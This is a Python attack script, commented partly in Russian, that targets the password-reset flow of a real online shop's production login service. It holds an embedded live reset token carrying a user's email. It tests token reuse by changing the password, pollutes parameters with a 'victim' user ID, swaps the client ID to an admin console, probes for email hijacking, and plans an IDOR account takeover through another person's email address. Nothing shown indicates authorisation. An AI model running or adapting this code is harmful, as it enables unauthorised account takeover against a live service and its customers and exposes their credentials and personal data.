#!/usr/bin/env python3
"""
REAL ATTACK: Тестирование реальных уязвимостей на password reset
- Token reuse
- IDOR через подмену user ID
- Account takeover
"""

import requests
import base64
import json

# Token из вашего email
RESET_TOKEN = "eyJhbGciOiJIUzUxMiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICIxOTFhOWY2OS01Y2IxLTRlY2MtYjA2MC00NDVjZjc1MDkyNzQifQ.eyJleHAiOjE3NjUzMDA3MzIsImlhdCI6MTc2NTIxNDMzMiwianRpIjoiMzI4ZTlkYjAtYmI5My00NGIwLTlhNGQtYzMxYzgxNGU0YTY5IiwiaXNzIjoiaHR0cHM6Ly9sb2dpbi56b29wbHVzLmRlL2F1dGgvcmVhbG1zL3pvb3BsdXMiLCJhdWQiOiJodHRwczovL2xvZ2luLnpvb3BsdXMuZGUvYXV0aC9yZWFsbWsvem9vcGx1cyIsInN1YiI6IjY2MDdkOTBmLWZkYzItNDM4Ny05YjYzLTFjOGZlYjcxMjUwYSIsInR5cCI6InJlc2V0LWNyZWRlbnRpYWxzIiwiYXpwIjoic2hvcC1teXpvb3BsdXMtcHJvZC16b29wbHVzIiwibm9uY2UiOiIzMjhlOWRiMC1iYjkzLTQ0YjAtOWE0ZC1jMzFjODE0ZTRhNjkiLCJhc2lkIjoiZDVmNzY0MGItNmU0OC00MzY0LTlmYzMtYmVlZGY3Y2E5NGYyLngtUEFfNkx0RXd3LjQ0NmQ4N2E2LTRmM2YtNDljZS1iMGZjLTA4ZWIzNTlkYjFkNyIsImVtbCI6InN1b2J1cEBkdW5rb3MueHl6In0.9hQRX_z1n8fjKkXTKfptiEBjvVr7lIEWK81C-vwaFLf_P0ihTh4_HfFW6du2twcMkiAjfkgsTrywLDVsiiUWOg"

BASE_URL = "https://login.zooplus.de"

def decode_jwt(token):
    parts = token.split('.')
    payload = parts[1] + '=' * (4 - len(parts[1]) % 4)
    return json.loads(base64.urlsafe_b64decode(payload))

def test_token_reuse():
    """CRITICAL TEST: Можно ли использовать token дважды?"""
    print("\n" + "="*80)
    print("ATTACK 1: TOKEN REUSE TEST")
    print("="*80)
    
    url = f"{BASE_URL}/auth/realms/zooplus/login-actions/action-token"
    params = {
        'key': RESET_TOKEN,
        'execution': '498adf7c-6e14-42f2-aee9-da9377272d41',
        'client_id': 'shop-myzooplus-prod-zooplus',
        'tab_id': 'x-PA_6LtEww',
        'ui_locales': 'de-DE'
    }
    
    session = requests.Session()
    
    # First use
    print("\n[*] First token use...")
    resp1 = session.get(url, params=params, allow_redirects=True)
    print(f"Status: {resp1.status_code}")
    print(f"Final URL: {resp1.url}")
    
    if "password" in resp1.text.lower() or "passwort" in resp1.text.lower():
        print("[+] Got password reset form!")
        
        # Try to submit password
        print("\n[*] Trying to set password: TestPass123!")
        # Find form action
        if "action=" in resp1.text:
            import re
            action_match = re.search(r'action="([^"]+)"', resp1.text)
            if action_match:
                form_action = action_match.group(1).replace("&amp;", "&")
                print(f"Form action: {form_action}")
                
                # Submit password
                password_data = {
                    'password-new': 'TestPass123!',
                    'password-confirm': 'TestPass123!'
                }
                
                resp_submit = session.post(form_action, data=password_data, allow_redirects=True)
                print(f"Submit status: {resp_submit.status_code}")
                print(f"Final URL: {resp_submit.url}")
                
                if "success" in resp_submit.text.lower() or "erfolgreich" in resp_submit.text.lower():
                    print("[+] Password changed successfully!")
                    
                    # NOW TRY TO USE TOKEN AGAIN
                    print("\n[*] Second token use (REUSE TEST)...")
                    session2 = requests.Session()
                    resp2 = session2.get(url, params=params, allow_redirects=True)
                    print(f"Status: {resp2.status_code}")
                    
                    if "password" in resp2.text.lower() or "passwort" in resp2.text.lower():
                        print("[!!!] VULNERABILITY: TOKEN CAN BE REUSED!")
                        print("[!!!] IMPACT: Attacker can use token multiple times")
                        print("[!!!] SEVERITY: HIGH")
                        return True
                    else:
                        print("[+] Token properly invalidated")
                        return False
    
    return None

def test_idor_attack():
    """CRITICAL: Попытка account takeover через IDOR"""
    print("\n" + "="*80)
    print("ATTACK 2: IDOR ACCOUNT TAKEOVER")
    print("="*80)
    
    payload = decode_jwt(RESET_TOKEN)
    print(f"\n[*] Current token user: {payload['eml']}")
    print(f"[*] Current user ID: {payload['sub']}")
    
    # Нужен reset token для ДРУГОГО пользователя (duststorm155@doncong.com)
    print("\n[!] To test IDOR:")
    print("1. Request password reset for duststorm155@doncong.com")
    print("2. Get that token")
    print("3. Try to use it with modified user_id parameter")
    print("4. If works → CRITICAL ACCOUNT TAKEOVER!")
    
    return None

def test_parameter_manipulation():
    """Test различных parameter manipulation атак"""
    print("\n" + "="*80)
    print("ATTACK 3: PARAMETER MANIPULATION")
    print("="*80)
    
    url = f"{BASE_URL}/auth/realms/zooplus/login-actions/action-token"
    
    # Test 1: Multiple user IDs
    print("\n[*] Test: Parameter pollution with multiple user_id...")
    params = {
        'key': RESET_TOKEN,
        'user_id': '00000000-0000-0000-0000-000000000001',  # Victim
        'execution': '498adf7c-6e14-42f2-aee9-da9377272d41',
        'client_id': 'shop-myzooplus-prod-zooplus',
    }
    
    resp = requests.get(url, params=params)
    print(f"Status: {resp.status_code}")
    
    if resp.status_code == 200 and "password" in resp.text.lower():
        print("[!] Parameters accepted - need manual verification")
    
    # Test 2: Client ID manipulation
    print("\n[*] Test: Different client_id...")
    params2 = {
        'key': RESET_TOKEN,
        'client_id': 'admin-console',  # Different client
        'execution': '498adf7c-6e14-42f2-aee9-da9377272d41',
    }
    
    resp = requests.get(url, params=params2)
    print(f"Status: {resp.status_code}")
    
    return None

def test_email_change():
    """Test: Можно ли изменить email через reset process?"""
    print("\n" + "="*80)
    print("ATTACK 4: EMAIL HIJACKING")
    print("="*80)
    
    print("[*] Testing if email can be changed during password reset...")
    
    url = f"{BASE_URL}/auth/realms/zooplus/login-actions/action-token"
    params = {
        'key': RESET_TOKEN,
        'execution': '498adf7c-6e14-42f2-aee9-da9377272d41',
        'client_id': 'shop-myzooplus-prod-zooplus',
    }
    
    session = requests.Session()
    resp = session.get(url, params=params, allow_redirects=True)
    
    if resp.status_code == 200:
        # Try to submit with different email
        print("[*] Attempting to change email during reset...")
        
        # Look for any email fields
        if 'email' in resp.text.lower() and 'input' in resp.text.lower():
            print("[!] Email field found in form!")
            print("[!] Potential email hijacking if not validated")
    
    return None

def main():
    print("="*80)
    print("ZOOPLUS REAL VULNERABILITY TESTING")
    print("Target: Password Reset Flow")
    print("="*80)
    
    # Run attacks
    findings = []
    
    # Attack 1: Token reuse (MOST CRITICAL)
    result = test_token_reuse()
    if result:
        findings.append({
            "title": "Password Reset Token Reuse",
            "severity": "HIGH",
            "cvss": "7.5",
            "impact": "Attacker can reuse intercepted token"
        })
    
    # Attack 2: IDOR
    test_idor_attack()
    
    # Attack 3: Parameter manipulation
    test_parameter_manipulation()
    
    # Attack 4: Email hijacking
    test_email_change()
    
    # Summary
    print("\n" + "="*80)
    print("FINDINGS SUMMARY")
    print("="*80)
    
    if findings:
        print(f"\n[!!!] Found {len(findings)} vulnerability(ies)!")
        for i, f in enumerate(findings, 1):
            print(f"\n{i}. {f['title']}")
            print(f"   Severity: {f['severity']} (CVSS: {f['cvss']})")
            print(f"   Impact: {f['impact']}")
    else:
        print("\n[+] No critical vulnerabilities found in automated testing")
        print("[*] Manual testing required for IDOR with second account")
    
    print("\n[*] Next: Request password reset for duststorm155@doncong.com")
    print("[*] Then test IDOR by swapping tokens!")

if __name__ == "__main__":
    main()

